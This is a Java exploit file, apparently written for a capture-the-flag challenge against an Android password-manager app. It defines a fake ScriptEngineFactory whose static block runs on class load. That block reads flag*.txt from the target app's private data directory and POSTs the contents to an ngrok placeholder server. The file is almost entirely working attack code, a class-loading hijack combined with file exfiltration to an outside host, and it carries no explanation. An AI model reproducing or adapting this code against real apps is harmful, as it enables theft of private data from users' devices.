package com.lbyte.mal;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Arrays;
import java.util.List;

public class BadScriptEngineFactory implements ScriptEngineFactory {

    // Static block for malicious action
    static {
        try {
            sendRequest("http://NGROK-SERVER/trigger");
            System.out.println("Triggered the exploit");

            String flagContent = readFlagFile("/data/data/com.aimardcr.pwdmanager/files/");
            if (flagContent != null) {
                sendFlagToServer("http://NGROK-SERVER/flag", flagContent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Function to send HTTP GET request
    private static void sendRequest(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);

        int responseCode = connection.getResponseCode();
        System.out.println("Request sent, response code: " + responseCode);
        connection.disconnect();
    }

    // Function to read the flag file
    private static String readFlagFile(String directoryPath) {
        try {
            Path dir = Paths.get(directoryPath);
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(dir, "flag*.txt")) {
                for (Path entry : stream) {
                    return new String(Files.readAllBytes(entry)); // Return the first match
                }
            }
        } catch (IOException e) {
            System.err.println("Failed to read flag file: " + e.getMessage());
        }
        return null;
    }

    // Function to send the flag content to the server
    private static void sendFlagToServer(String serverUrl, String flagContent) throws Exception {
        URL url = new URL(serverUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

        try (OutputStream os = connection.getOutputStream()) {
            String data = "flag=" + flagContent;
            os.write(data.getBytes());
            os.flush();
        }

        int responseCode = connection.getResponseCode();
        System.out.println("Flag sent, response code: " + responseCode);
        connection.disconnect();
    }

    @Override
    public String getEngineName() {
        return "BadScriptEngine";
    }

    @Override
    public String getEngineVersion() {
        return "1.0";
    }

    @Override
    public List<String> getExtensions() {
        return Arrays.asList("bad", "exploit");
    }

    @Override
    public List<String> getMimeTypes() {
        return Arrays.asList("application/x-bad", "application/x-exploit");
    }

    @Override
    public List<String> getNames() {
        return Arrays.asList("badscript", "exploitlang");
    }

    @Override
    public String getLanguageName() {
        return "ExploitLang";
    }

    @Override
    public String getLanguageVersion() {
        return "1.0";
    }

    @Override
    public Object getParameter(String key) {
        switch (key) {
            case ScriptEngine.ENGINE:
                return getEngineName();
            case ScriptEngine.ENGINE_VERSION:
                return getEngineVersion();
            case ScriptEngine.LANGUAGE:
                return getLanguageName();
            case ScriptEngine.LANGUAGE_VERSION:
                return getLanguageVersion();
            case ScriptEngine.NAME:
                return getNames().get(0);
            case "THREADING":
                return "MULTITHREADED";
            default:
                return null;
        }
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        StringBuilder syntax = new StringBuilder(obj + "." + m + "(");
        for (int i = 0; i < args.length; i++) {
            syntax.append(args[i]);
            if (i < args.length - 1) syntax.append(", ");
        }
        syntax.append(")");
        return syntax.toString();
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return "System.out.println(\"" + toDisplay + "\");";
    }

    @Override
    public String getProgram(String... statements) {
        StringBuilder program = new StringBuilder();
        for (String statement : statements) {
            program.append(statement).append(";\n");
        }
        return program.toString();
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
